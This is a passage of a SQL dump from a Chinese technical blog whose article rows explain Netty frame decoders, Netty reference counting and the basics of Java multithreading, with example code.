decode(ChannelHandlerContext channelHandlerContext, ByteBuf buf, List<Object> out) throws Exception {\n        if (!readLength) {\n            length = buf.readInt();\n            readLength = true;\n            checkpoint();\n        }\n        if (readLength) {\n            ByteBuf frame = buf.readBytes(length);\n            readLength = false;\n            checkpoint();\n            out.add(frame);\n        }\n    }\n}\n\n```\n### 解决粘包拆包\n#### 基本概念\n```java\n// 粘包拆包\n(1) TCP像流一样的传输数据,服务端无法分清各自请求的数据\n(2) 服务端可能会将一个包给解析成多个包,也有可能将多个包解析成少量的包\n(3) 我们可以通过自定义解码器解决这个问题,但也可以通过Netty提供的解码器来解决这个问题\n\nLineBasedFrameDecoder\nFixedLengthFrameDecoder\nDelimiterBasedFrameDecoder\nLengthFieldBasedFrameDecoder\n```\n\n#### LineBasedFrameDecoder\n```java\n// 它是一个基于行的解码器,它会将所接收到的ByteBuf按照行的结尾标识进行分割,比如说 \\n  和 \\r\\n 都会被进行处理\n  +-----------------+\n  | ABC\\nDE\\r\\nFGHI |\n  +-----------------+\n// 一个LineBasedFrameDecoder(5) 表示解码帧的最大长度,如果帧的长度超过此值，则抛出TooLongFrameException\n  +-----+----+------+\n  | ABC | DE | FGHI |\n  +-----+----+------+\n\n它是一个基于行的解码器,它会将所接收到的ByteBuf按照行的结尾标识进行分割,*比如说 \\n  和 \\r\\n 都会被进行处理*\n```\n#### FixedLengthFrameDecoder\n```java\n  // 它是一个基于固定长度的帧解码器,它会将所接收到的ByteBuf根据固定长度的字节来进行分割\n  // 比如说你接收到了四个包\n  +---+----+------+----+\n  | A | BC | DEFG | HI |\n  +---+----+------+----+\n  // 一个FixedLengthFrameDecoder(3)就会将它们解码成如下三个包,每次都使用固定长度的\n  +-----+-----+-----+\n  | ABC | DEF | GHI |\n  +-----+-----+-----+\n它是一个基于固定长度的帧解码器,它会将所接收到的ByteBuf根据固定长度的字节来进行分割\n```\n\n#### DelimiterBasedFrameDecoder\n```java\n// DelimiterBasedFrameDecoder允许指定超过一个分隔符\n// 如果在Buffer当中找到了多个分隔符的话,它就会选择生成最小的帧\n  +--------------+\n  | ABC\\nDEF\\r\\n |\n  +--------------+\n// 一个DelimiterBasedFrameDecoder(Delimiters.lineDelimiter()),它将会选择 \'\\n\' 来作为第一个分隔符,并且生成两个帧\n  +-----+-----+\n  | ABC | DEF |\n  +-----+-----+\n// 而不会选择 \'\\r\\n\' 作为第一个分割,否则就会变成这样\n  +----------+\n  | ABC\\nDEF |\n  +----------+ \n\n(1) 它是一个基于分隔符的帧解码器,它会将所接收到的ByteBuf根据一个或多个分隔符进行分割,它在解码一个*NULL*或*newLine*等结尾时特别有帮助\n(2) Delimiters定义了一些常见的分隔符用于方便的去使用\n(3) 我们也可以指定超过一个分隔符,如果在Buffer当中找到了多个分隔符的话,它就会选择生成*最小的帧*\n\n```\n#### LengthFieldBasedFrameDecoder\n```java\n// 它是一个基于长度字段的帧解码器,它会将所接收到ByteBuf进行分割,根据消息当中的length字段值进行分割\n// 它当你在解码一个二进制消息时特别的有用,拥有一个header头字段,它代表的是body消息体或者是整个消息的长度\n// 对它的属性有一些基本了解\n\n// 两个字节的length长度字段,offset偏移量是0,不会去去除header\n// 这个length字段的值是12(0X0C),它表示的是\"HELLO, WORLD\"的长度,\n// 在默认情况下解码器会假设这个length长度字段代表的是这个// length长度字段后面所跟随的字节数\n// 因此它可以通过最简单的参数组合来进行解码\n  lengthFieldOffset   = 0\n  lengthFieldLength   = 2\n  lengthAdjustment    = 0\n  initialBytesToStrip = 0 (= do not strip header)\n	\n  // 解码前是14个字节	           解码后也是14个字节\n  BEFORE DECODE (14 bytes)         AFTER DECODE (14 bytes)\n  +--------+----------------+      +--------+----------------+\n  | Length | Actual Content |----->| Length | Actual Content |\n  | 0x000C | \"HELLO, WORLD\" |      | 0x000C | \"HELLO, WORLD\" |\n  +--------+----------------+      +--------+----------------+\n// 通过Length中的值12,得知Content的长度是12,这样就可以取到Content\n\n  2 bytes length field at offset 0, strip header\n// 由于我们可以通过调用ByteBuf.readableBytes()得到content内容的长度\n// 你可能想要通过指定initialBytesToStrip这个属性去除掉length长度字段\n// 在这个例子当中,我们指定的是2,它与length长度字段相同,意思是去除前两个字节\n  lengthFieldOffset   = 0\n  lengthFieldLength   = 2\n  lengthAdjustment    = 0\n  initialBytesToStrip = 2 (= the length of the Length field)\n\n  // 解码前是14个字节	           解码后是12个字节\n  BEFORE DECODE (14 bytes)         AFTER DECODE (12 bytes)\n  +--------+----------------+      +----------------+\n  | Length | Actual Content |----->| Actual Content |\n  | 0x000C | \"HELLO, WORLD\" |      | \"HELLO, WORLD\" |\n  +--------+----------------+      +----------------+\n// 去除前两个字节也就是header,表示只要真正的内容\n\n2 bytes length field at offset 0, do not strip header, the length field represents the length of the whole message\n// 在大多数情况下,length长度字段仅仅表示content消息体的长度,正如前面的例子所表示的一样\n// 然而在某些协议当中,这个length长度字段代表的是整个消息的长度(header+bodycontent)\n// 在这种情况下,我们就会指定一个非零的lengthlengthAdjustment\n// 因为在这个例子当中消息长度总是要比content内容体多2,因此我们将lengthAdjustment指定为-2进行补偿\n  lengthFieldOffset   =  0\n  lengthFieldLength   =  2\n  lengthAdjustment    = -2 (= the length of the Length field)\n  initialBytesToStrip =  0\n\n  // 解码前是14个字节	           解码后也是14个字节\n  BEFORE DECODE (14 bytes)         AFTER DECODE (14 bytes)\n  +--------+----------------+      +--------+----------------+\n  | Length | Actual Content |----->| Length | Actual Content |\n  | 0x000E | \"HELLO, WORLD\" |      | 0x000E | \"HELLO, WORLD\" |\n  +--------+----------------+      +--------+----------------+\n// 注意0X000E表示14,是整个消息的长度;而不是仅仅表示content真实内容的长度\n// 通过lengthAdjustment,我们直到content内容体的真实长度\n\n(1) 它是一个基于长度字段的帧解码器,它会将所接收到ByteBuf进行分割,根据消息当中的length字段值进行分割,.它当你在解码一个二进制消息时特别的有用,拥有一个header头字段,它代表的是body消息体或者是整个消息的长度\n(2) LengthFieldBasedFrameDecoder拥有很多的配置参数,这样它就可以通过一个length字段,来去解码任意的一种消息,通常是在一些私有的客户端服务端协议当中经常出现\n```', 0, 0, 121, 0, 0, '2020-02-16 12:32:19', '2020-02-16 12:32:19', 0, 0);
INSERT INTO `article` VALUES (73, 1, 'Netty的引用计数机制', '2019/10/1571315822_mmexport1571315355464.jpg', '### 引用计数机制\n```java\n// 引用计数机制的ReferenceCounted概述\n(1) 这是一个引用计数的对象,需要显式的去回收取消分配\n(2) 当一个新的ReferenceCounted被实例化之后,它会将其引用计数初始化为1,retain()会增加引用计数+1,而release()会减少引用计数-1\n(3) 当引用计数被降低为0调用deallocate()具体实现根据缓冲区类型,对象将会显式的取消分配回收,回收之后我门访问所有已经被回收的对象,都会导致访问的错误,抛出IllegalReferenceCountException\n(4) 如果实现ReferenceCounted的对象是其他实现ReferenceCounted 的对象的容器,当外层容器的引用计数变为0时候,里面包含的对象也将通过release()释放\n\n// ReferenceCounted方法\n(1) refCnt(): 返回这个对象的引用计数数值,如果是0的话,表示这个对象已经被回收掉了\n(2) ratain(): 将这个对象的引用计数+1\n(3) ratain(int): 将这个对象的引用计数添加传入的数量	\n(4) touch(): 记录此对象的当前访问位置以进行调试,如果确定此对象已内存泄露,则将向您提供此操作记录的信息通过ResourceLeakDetector,此方法是touch(Object) touch(null)的快捷方式\n(5) release(): 将这个对象的引用计数-1,当引用计数值已经到达0的话,就回收这个对象\n(6) release(int): 将这个对象的引用计数减少传入的数量,当引用计数值已经到达0的话,就回收这个对象\n\n```\n#### AbstractReferenceCountedByteBuf\n![rerCntUpdater1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568552435_rerCntUpdater1.png)\n![rerCntUpdater2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568552436_rerCntUpdater2.png)\n```java\n(1) 一个抽象的基类,实现了ReferenceCounted,针对于使用引用计数的ByteBuf的实现\n(2) retain(): 使用自旋锁+cas机制修改计数值\n(3) 引用计数实现在refCount的这个属性使用了AtomicIntegerFieldUpdate和cas\n(4) Netty的引用计数计数器本身基于AtomicIntegerFieldUpdate\n(5) 关于引用计数,每一个ByteBuf它的引用计数初始值就是1,当每次调用retain()会增加引用计数+1,而release()会减少引用计数-1,当引用计数被降低为0,这时这个ByteBuf对象就不能再去被使用了\n\n// AtomicIntegerFieldUpdate\n(1) 更新器更新的必须是int类型变量,不能是其包装类型\n(2) 更新器更新的必须是volatile类型变量,确保线程之间共享变量时的立刻可见性,禁止重排序\n(3) 变量不能是static的,必须要是实例变量.因为Unsafe.objectFieldOffset()方法不支持静态变量(CAS操作本质上是通过对象实例的偏移量来直接进行赋值)\n(4) 更新器只能修改它可见范围内的变量,因为更新器是通过反射来得到这个变量,如果变量不可见就会报错\n\n// 为什么不使用原始的AtomicInteger\n(1) 是因为ByteBuf对象是用的非常多的,如果每个对象都有一层AtomicInteger对int的包装的话,会导致开销会大一些,使用AtomicIntegerFieldUpdate全局只有一个静态的变量,一个变量就可以维护所有的,这是一种高效的做法\n\n```\n### 使用引用计数\n#### netty的ByteBuf使用引用计数\n```java\n// 关于引用计数\n(1) 从Netty版本4开始,某些对象的生命周期是由它们的引用计数来进行管理的,这样的话Netty就可以将其返回到一个对象池里面垃圾回收和资源队列没有提供对于不可达的这样一种有效实时的保证\n(2) 引用计数就提供了另一种解决方案,它的代价就是用起来不是很方便,因为对于Java开发者来说,早已习惯了对象只需创建无需回收.然而对于引用计数领域来说,你需要时刻的想清楚考虑到引用计数到底是多少,什么时候把它引用计数+1或-1\n(3) ByteBuf是最值得注意的一种类型,它充分利用了引用计数来去改进分配和回收的性能\n\n// 创建引用计数对象\n// 新创建基于引用计数的对象,它的初始的引用计数值就是1\nByteBuf buf = ctx.alloc().directBuffer();\nassert buf.refCnt() == 1;\n\n// 减少引用计数值\nassert buf.refCnt() == 1;\n// release() returns true only if the reference count becomes 0.\nboolean destroyed = buf.release();\nassert destroyed;\nassert buf.refCnt() == 0;\n\n// 当你释放引用计数的时候,它的引用计数值就会-1,如果引用计数值到达了0的话,引用计数对象就会被回收掉,或者返回到它所来自于的那个对象池当中,这取决于ByteBuf是否是池化的\n\n// 访问已释放的引用计数对象\nassert buf.refCnt() == 0;\ntry {\n  buf.writeLong(0xdeadbeef);\n  throw new Error(\"should not reach here\");\n} catch (IllegalReferenceCountExeception e) {\n  // Expected\n}\n// 我们尝试去访问引用计数值为0的引用计数对象就会触发一个IllegalReferenceCountException异常\n\n// 增加引用计数值\nByteBuf buf = ctx.alloc().directBuffer();\nassert buf.refCnt() == 1;\n\nbuf.retain();\nassert buf.refCnt() == 2;\n\nboolean destroyed = buf.release();\nassert !destroyed;\nassert buf.refCnt() == 1;\n// 增加引用计数,引用计数可以实现retain()这个操作去进行增加,前提是它没有被销毁\n```\n#### 谁来销毁引用计数对象\n```java\npublic ByteBuf a(ByteBuf input) {\n    input.writeByte(42);\n    return input;\n}\n\npublic ByteBuf b(ByteBuf input) {\n    try {\n        output = input.alloc().directBuffer(input.readableBytes() + 1);\n        output.writeBytes(input);\n        output.writeByte(42);\n        return output;\n    } finally {\n        input.release();\n    }\n}\n\npublic void c(ByteBuf input) {\n    System.out.println(input);\n    input.release();\n}\n\npublic void main() {\n    ...\n    ByteBuf buf = ...;\n    // This will print buf to System.out and destroy it.\n    c(b(a(buf)));\n    assert buf.refCnt() == 0;\n} \n\nAction						Who should release?	          Who released?\n1. main() creates buf	           buf→main()	\n2. main() calls a() with buf	    buf→a()	\n3. a() returns buf merely.	      buf→main()	\n4. main() calls b() with buf	    buf→b() 	\n5. b() returns the copy of buf	  buf→b(),copy→main()	b() releases buf\n6. main() calls c() with copy	   copy→c()  	 \n7. c() swallows copy	            copy→c()	       c() releases copy\n\n(1) 谁最后访问引用计数对象,最后访问的对象那一方它来负责引用计数对象的销毁,更为具体的\n(2) 如果一个组件期待着传递一个引用计数对象向另一个组件,相当于发送方向接受方传递了一个引用计数对象,发送方通常是不需要销毁它的,而是将这个决策交给了接收方来决定\n(3) 如果一个组件消费了一个引用计数对象,并且它知道没有其他的组件再去访问这个引用计数对象了,那么这个组件就应该销毁这个引用计数对象\n```\n#### 衍生的Buffer视图\n```java\nByteBuf parent = ctx.alloc().directBuffer();\nByteBuf derived = parent.duplicate();\n\n// Creating a derived buffer does not increase the reference count.\nassert parent.refCnt() == 1;\nassert derived.refCnt() == 1;\n\n// ByteBuf的duplicate(),slice()以及order()等方法来创建一个衍生的Buffer\n// 衍生的Buffer会跟它的原始Buffer共享同一个内容区域\n// *衍生下来的Buffer并没有自己的引用计数,而是共享原始Buffer的引用计数*\n\nByteBuf parent = ctx.alloc().directBuffer(512);\nparent.writeBytes(...);\n\ntry {\n    while (parent.isReadable(16)) {\n        ByteBuf derived = parent.readSlice(16);\n        derived.retain();\n        process(derived);\n    }\n} finally {\n    parent.release();\n}\n\n(1) 请注意,原始Buffer和衍生Buffer会共享相同的引用计数,而引用计数当衍生Buffer被创建时并不会增加,因此,当你将要把一个衍生Buffer传递到应用其他的组件时候,你需要首先调用一个retain()方法\n(2) ByteBuf的copy(),readBytes(int)等方法并不是衍生的Buffer,它们直接把内存重新拷贝了一份,因此这种情况下,所返回来的ByteBuf有自己的引用计数器,是需要被释放的\n```\n### ChannelHandler的引用计数\n#### 入栈消息\n```java\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    ByteBuf buf = (ByteBuf) msg;\n    try {\n        ...\n    } finally {\n        buf.release();\n    }\n}\n\n当一个事件循环将数据读取到一个ByteBuf对象,然后触发了channelRead()事件时候,应该是由ChannelPipeline中相应的ChannelHandle来去释放相应的Buffer对象,*因此消费接收数据的这个ChannelHandler应该在它的channelRead()当中释放ByteBuf对象.谁最后使用ByteBuf对象,谁就应该调用release()方法进行释放*\n\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    ByteBuf buf = (ByteBuf) msg;\n    ...\n    ctx.fireChannelRead(buf);\n}\n\n//  如果ChannelHandler将这个Buffer对象传递给了下一个ChannelHandler,那么就不需要去释放它\n// Assuming your handler is placed next to `HttpRequestDecoder`\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    if (msg instanceof HttpRequest) {\n        HttpRequest req = (HttpRequest) msg;\n        ...\n    }\n    if (msg instanceof HttpContent) {\n        HttpContent content = (HttpContent) msg;\n        try {\n            ...\n        } finally {\n            content.release();\n        }\n    }\n}\n\n// 请注意,ByteBuf并不是Netty中唯一的引用计数类型,如果你正在处理由decoder生成的消息的话,msg很有可能也是引用计数类型的\n\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    try {\n        ...\n    } finally {\n        ReferenceCountUtil.release(msg);\n    }\n}\n如果你搞不清楚,简化释放消息的过程,那么你可以使用ReferenceConUtil.release();\n此外你应该去考虑使用SimpleChannelHandler,它会对接收到的所有消息调用release()方法\n\n```\n#### 出栈消息\n```java\n// Simple-pass through\npublic void write(ChannelHandlerContext ctx, Object message, ChannelPromise promise) {\n    System.err.println(\"Writing: \" + message);\n    ctx.write(message, promise);\n}\n\n// Transformation\npublic void write(ChannelHandlerContext ctx, Object message, ChannelPromise promise) {\n    if (message instanceof HttpContent) {\n        // Transform HttpContent to ByteBuf.\n        HttpContent content = (HttpContent) message;\n        try {\n            ByteBuf transformed = ctx.alloc().buffer();\n            ....\n            ctx.write(transformed, promise);\n        } finally {\n            content.release();\n        }\n    } else {\n        // Pass non-HttpContent through.\n        ctx.write(message, promise);\n    }\n}\n\n与入栈消息不同的是,出栈消息是由应用所创建的,因此这是由Netty来负责写完之后释放消息,然而拦截写请求的处理器也应该确保释放中间的一些对象\n```\n\n#### SimpleChannelInboundHandler\n![simpleChannelInboundHandlerChannelRead.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568636701_simpleChannelInboundHandlerChannelRead.png)\n```java\n// 与ChannelInboundHandler不同\n	@Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        ctx.channel().writeAndFlush(msg); // 将会被释放,导致失效\n    }\n\n(1) 本身是一个ChannelInboundHandleAdapter,它允许让我们的显式的处理特定类型的消息\n(2) 注意构造方法参数的不同,它会释放已经处理的消息(通过将这些消息传递给ReferenceCountUtil.release)注意构造方法参数的不同,它会释放已经处理的消息(通过将这些消息传递给ReferenceCountUtil.release)\n(3) 如果你想要将消息传递给下一个处理器的话,这个时候需要通过使用ReferenceCountUtil.retain(object)\n(4) 因为会释放资源,我们不要存储这个消息的引用,因为这个引用会失效,netty会把这个资源释放掉\n```\n### ChannelPipeline源码中的引用计数\n#### AbstractNioByteChannel\n![AbstractNioByteChannelRead.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568555325_AbstractNioByteChannelRead.png)\n```java\n将从客户端接收过来的数据转换成ByteBuf对象,read(),往ChannelPipeline后面不断传递	\n```\n#### TailContext\n![tailContextUserEventTriggered.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568555325_tailContextUserEventTriggered.png)\n```java\n(1) DefaultChannelPipeline的内部类\n(2) 整个入栈处理器的最后一个,它显然需要进行一些资源的释放\n(3) userEventTriggered()方法当中调用了ReferenceCountUtil.release(evt);\n\n```\n#### HeaderContext\n![ChannelOutboundBuffeRemove.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568555325_ChannelOutboundBuffeRemove.png)\n```java\n(1) DefaultChannelPipeline的内部类\n(2) 整个出栈处理器的最后一个,它显然需要进行一些资源的释放\n(3) flush()方法当中unsafe.flush()把引用计数对象释放\n(4) 最终在ChannelOutboundBuffer的remove()方法中进行释放\n\n```\n```java\n参考文献\nhttps://netty.io/wiki/reference-counted-objects.html\n```', 0, 0, 75, 0, 0, '2020-02-16 20:37:09', '2020-02-16 20:37:09', 0, 0);
INSERT INTO `article` VALUES (74, 1, 'Java的多线程基本概述', '2018/8/1533873011_fdca7053ee1dd61cb49be519daa2f874.jpg', '### 基本概念\n```java\n// 进程与线程\n(1) 进程是独立应用程序\n(2) 线程属于进程,是一条执行路径\n(3) CPU随机切换进程,人为以为进程都在同时执行,但是底层CPU在进行不断的进行切换\n(4) 进程是该进程下所有线程集合,进程存在,那么主线程一定存在,GC线程与主线程绑定\n(5) 多线程使用目的是为了提高程序效率\n\n// 线程的分类\n(1) 用户线程: 如果主线程停止,不会影响用户线程,和主线程互不影响\n(2) 守护线程: 如果主线程停止,会影响守护线程,随主线程一起销毁,Java中设置setDaemon(true)即可为守护线程 \n(3) GC线程: 属于守护线程,垃圾回收机制的线程,不定时回收,主要回收主线程,但也会回收子线程。\n\n// 多线程的应用场景\n(1) 下载文件\n(2) 数据库连接池\n(3) 发送邮件,短信等耗费等待时间操作\n(4) 大规模的运算处理,业务处理\n\n// 并发\n(1) 多个线程操作相同的资源.保证线程安全,合理使用资源\n(2) 同时拥有两个或者多个线程,如果程序在单核处理器上运行,多个线程将交替地换入或换出内存\n(3) 这些线程是同时存在的,每个线程都处于执行过程中的某个状态 \n(4) 如果运行在多核处理器上,程序中每个线程都将分配到一个处理器核上,因此可以同时运行\n(5) 服务能同时处理很多请求,提高程序性能\n(6) 高并发(High Concurrency)是互联网分布式系统架构设计中必须考虑的因素之一\n(7) 高并发通常是指通过设计保证系统能够同时并行处理很多的请求\n\n// 并发的优势和风险\n// 优势:\n(1) 速度,同时处理多个请求,响应更快,复杂的操作可以分成多个进程同时进行\n(2) 设计,程序设计在某些情况下更简单,也可以有更多的选择\n(3) 资源利用,CPU能够在等待IO的时候作做一些其他的事情   \n// 风险:\n(1) 安全性,多个线程共享数据时可能会产生于期望不相符的结果\n(2) 活跃性,某个操作无法继续进行下去时,就会发生活跃性问题,比如死锁,饥饿\n(3) 性能,线程过多时会使得CPU频繁切换,调度时间增多,同步机制消耗过多内存\n\n// 并发与并行\n并行: 多核CPU并行,同时执行\n并发: 单个CPU在进程之间切换,看起来程序并行\n\n// Java线程概念\n(1) Java应用程序的main函数是一个线程,是被JVM启动的时候调用,线程的名字叫main\n(2) 实现一个线程,必须创建Thread实例,override run方法,并且调用start方法\n(3) 在JVM启动后,实际上有多个线程,但是有一个非守护线程main\n(4) 当你调用一个线程start方法的时候,此时至少有两个线程,一个是调用的线程,还有一个执行run方法的线程\n\n// 默认线程名称\n(1) 创建线程对象Thread,默认有一个线程名,已Thread-开头,从0开始计数\n(2) 构造函数 Thread()\n\n// 传递runnable与复写run方法\n(1) 如果在构造Thread的时候没有传递Runnable或者没有复写Thread的run方法,该Thread将不会调用任何东西\n(2) 如果传递了Runnable接口的实例或者复写了Thread的run方法,则会执行该方法的逻辑单元(逻辑代码)\n(3) 构造函数Thread(),Thread(Runnable),Thread(Runnable, String),Thread(String)\n```\n### 多线程的状态\n![并发编程多线程的状态.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626614966_并发编程-多线程的状态.png)\n```java\n// New 新建状态\n(1) 当用new操作符创建一个线程时。此时程序还没有开始运行线程中的代码\n// Runnable 就绪状态\n(1) 一个新创建的线程并不自动开始运行，要执行线程，必须调用线程的start()方法。当线程对象调用start()方法即启动了线程，start()方法创建线程运行的系统资源，并调度线程运行run()方法。当start()方法返回后，线程就处于就绪状态。\n(2) 处于就绪状态的线程并不一定立即运行run()方法，线程还必须同其他线程竞争CPU时间，只有获得CPU时间才可以运行线程。因为在单CPU的计算机系统中，不可能同时运行多个线程，一个时刻仅有一个线程处于运行状态。因此此时可能有多个线程处于就绪状态。对多个处于就绪状态的线程是由Java运行时系统的线程调度程序来调度的。\n// Running 运行状态\n(1) 当线程获得CPU时间后，它才进入运行状态，真正开始执行run()方法。\n// Blocked 阻塞状态\n(1) 线程运行过程中，可能由于各种原因进入阻塞状态：\n	(1) 线程通过调用sleep方法进入睡眠状态；\n	(2) 线程调用一个在I/O上被阻塞的操作，即该操作在输入输出操作完成之前不会返回到它的调用者；\n	(3) 线程试图得到一个锁，而该锁正被其他线程持有；\n	(4) 线程在等待某个触发条件；\n(2) 所谓阻塞状态是正在运行的线程没有运行结束，暂时让出CPU，这时其他处于就绪状态的线程就可以获得CPU时间，进入运行状态。\n(3) 线程被堵塞可能是由下述五方面的原因造成的：\n	(1) 调用sleep(毫秒数)，使线程进入\"睡眠\"状态。在规定的时间内，这个线程是不会运行的\n	(2) 用suspend()暂停了线程的执行。除非线程收到resume()消息，否则不会返回\"可运行\"状态\n	(3) 用wait()暂停了线程的执行。除非线程收到nofify()或者notifyAll()消息，否则不会变成\"可运行\"（是的，这看起来同原因2非常相象，但有一个明显的区别是我们马上要揭示的）\n	(4) 线程正在等候一些IO（输入输出）操作完成\n	(5) 线程试图调用另一个对象的\"同步\"方法，但那个对象处于锁定状态，暂时无法使用\n// Terminated 终止状态\n(1) 有两个原因会导致线程死亡\n	(1) run方法正常退出而自然死亡\n	(2) 一个未捕获的异常终止了run方法而使线程猝死\n(2) 为了确定线程在当前是否存活着（就是要么是可运行的，要么是被阻塞了），需要使用isAlive方法，如果是可运行或被阻塞，这个方法返回true；如果线程仍旧是new状态且不是可运行的，或者线程死亡了，则返回false\n```\n### 代码示例\n#### Daemon守护线程\n```java\n	public static void main(String[] args) {\n        Thread t = new Thread(() -> {\n            Thread innerThread = new Thread(() -> {\n                try {\n                    while (true) {\n                        System.out.println(\"Do some thing for health check.\");\n                        Thread.sleep(1_000);\n                    }\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            });\n            // innerThread.setDaemon(true); // innerThread跟随t终止\n            innerThread.start();\n            try {\n                Thread.sleep(100);\n                System.out.println(\"T thread finish done.\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        // t.setDaemon(true); // t跟随main终止\n        t.start();\n    }\n\n(1) 守护线程,当threadGroup线程执行完毕后,被设置为setDaemon(true)的守护线程将会终止任务跟随死亡\n(2) 许多框架的start方法的线程都是守护线程,跟随主线程死亡\n```\n#### Priority优先级\n```java\n	public static void main(String[] args) {\n        Thread t1 = new Thread(() -> {\n            for (int i = 0; i < 1000; i++) {\n                Optional.of(Thread.currentThread().getName() + \"-index\" + i).ifPresent(System.out::println);\n            }\n        });\n        t1.setPriority(Thread.MAX_PRIORITY);\n        Thread t2 = new Thread(() -> {\n            for (int i = 0; i < 1000; i++) {\n                Optional.of(Thread.currentThread().getName() + \"-index\" + i).ifPresent(System.out::println);\n            }\n        });\n        t2.setPriority(Thread.NORM_PRIORITY);\n        Thread t3 = new Thread(() -> {\n            for (int i = 0; i < 1000; i++) {\n                Optional.of(Thread.currentThread().getName() + \"-index\" + i).ifPresent(System.out::println);\n            }\n        });\n        t3.setPriority(Thread.MIN_PRIORITY);\n        t1.start();t2.start();t3.start();\n    }\n\nPriority优先级,CPU调度的优先级\n```\n#### Join等待执行结束\n```java\npublic class ThreadJoin3 {\n    public static void main(String[] args) throws InterruptedException {\n        long startTimestamp = System.currentTimeMillis();\n        Thread t1 = new Thread(new CaptureRunnable(\"M1\", 10000L));\n        Thread t2 = new Thread(new CaptureRunnable(\"M2\", 10000L));\n        Thread t3 = new Thread(new CaptureRunnable(\"M3\", 10000L));\n        t1.start();\n        t2.start();\n        t3.start();\n        t1.join();\n        t2.join();\n        t3.join();\n        long endTimestamp = System.currentTimeMillis();\n        System.out.printf(\"Save data begin timestamp is:%s, end timestamp is:%s\", startTimestamp, endTimestamp);\n    }\n}\nclass CaptureRunnable implements Runnable {\n    private String machineName;\n\n    private long spendTime;\n    public CaptureRunnable(String machineName, long spendTime) {\n        this.machineName = machineName;\n        this.spendTime = spendTime;\n    }\n    @Override\n    public void run() {\n        // do the really capture data.\n        try {\n            Thread.sleep(spendTime);\n            System.out.printf(machineName + \"completed data capture at timestamp [%s] and successfully\\n\", System.currentTimeMillis());\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n    public String getResult() {\n        return machineName + \"finish.\";\n    }\n}\n\n(1) join: 当前线程等待该线程执行结束\n(2) Thread.currentThread().join(): 当前线程join住,直到当前线程死掉,使得自己一直在运行状态\n\n```\n#### interrupt中断线程\n```java\n// 使用标识关闭\npublic class ThreadCloseGraceful {\n    private static class Worker extends Thread {\n        private volatile boolean start = true;\n        \n        @Override\n        public void run() {\n            while (start) {\n\n            }\n        }\n        public void shutdown() {\n            this.start = false;\n        }\n    }\n    public static void main(String[] args) {\n        Worker worker = new Worker();\n        worker.start();\n        try {\n            Thread.sleep(10_000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        worker.shutdown();\n    }\n} \n\n// 使用interrupted关闭\npublic class ThreadCloseGraceful2 {\n    private static class Worker extends Thread {\n        @Override\n        public void run() {\n            while (true) {\n                // 使用interrupted判断是否中断进行终止\n                if (Thread.interrupted()) {\n                    break;\n                }\n                // 或者下面这种方法,捕获异常进行终止\n                try {\n                    Thread.sleep(1);\n                } catch (InterruptedException e) {\n                    break;\n                }\n            }\n        }\n    }\n    public static void main(String[] args) {\n        Worker worker = new Worker();\n        worker.start();\n        try {\n            Thread.sleep(10_000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        worker.interrupt();\n    }\n}\n\n(1) interrupt用于终止线程,也可以使用标识方式进行终止\n(2) interrupt可以打断主线程\n```\n\n\n#### 子线程打断主线程\n```java\npublic class ThreadInterupt2 {\n    public static void main(String[] args) {\n        Thread t = new Thread() {\n            @Override\n            public void run() {\n                while (true) {\n\n                }\n            }\n        };\n        t.start();\n        Thread main = Thread.currentThread();\n        Thread t2 = new Thread() {\n            @Override\n            public void run() {\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                main.interrupt(); // t2打断main线程\n                System.out.println(\"interrupt\");\n            }\n        };\n        t2.start();\n        try {\n            t.join(); // main等待t执行结束,显然永远也不会结束\n        } catch (InterruptedException e) {\n            System.out.println(\"main线程被打断了,捕获异常\");\n            e.printStackTrace();\n        }\n        System.out.println(\"end\");\n    }\n}\n\ninterrupt可以打断主线程\n```\n#### 自定义超时打断机制\n```java\npublic class ThreadCloseForce {\n    public static void main(String[] args) {\n        ThreadService service = new ThreadService();\n        long start = System.currentTimeMillis();\n        service.execute(()->{\n            // load a very heavy resource\n            try {\n                Thread.sleep(50_000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        service.shutdown(10_000);\n        long end = System.currentTimeMillis();\n        System.out.println(end - start);\n    }\n}\npublic class ThreadService {\n\n    private Thread executeThread;\n\n    private boolean finished = false;\n\n    public void execute(Runnable task) {\n        executeThread = new Thread() {\n            @Override\n            public void run() {\n                Thread runner = new Thread(task);\n                runner.setDaemon(true);\n                runner.start();\n                try {\n                    runner.join();\n                    finished = true;\n                } catch (InterruptedException e) {\n                    // e.printStackTrace();\n                }\n            }\n        };\n        executeThread.start();\n    }\n    public void shutdown(long mills) {\n        long currentTime = System.currentTimeMillis();\n        while (!finished) {\n            if ((System.currentTimeMillis() - currentTime) >= mills) {\n                System.out.println(\"任务超时,需要结束它!\");\n                executeThread.interrupt();\n                break;\n            }\n            try {\n                executeThread.sleep(1);\n            } catch (InterruptedException e) {\n                System.out.println(\"代理执行线程被打断\");\n                break;\n            }\n        }\n        finished = false;\n    }\n}\n\n通过守护线程这一巧妙的机制,通过daemon,join,interrupt等方式即可实现超时打断的机制\n```\n#### waitSet\n```java\npublic class WaitSet {\n\n    private static final Object LOCK = new Object();\n\n    private static void work() {\n        synchronized (LOCK) {\n            System.out.println(\"Begin....\");\n            try {\n                System.out.println(\"Thread will coming.\");\n                LOCK.wait();// 唤醒后将重新获取锁但会继续从此处执行,因为wait时记录执行地址 唤醒时恢复执行地址位置\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"Thread will out.\");\n        }\n    }\n\n    /**\n     * 1. 所有的对象都会有一个wait 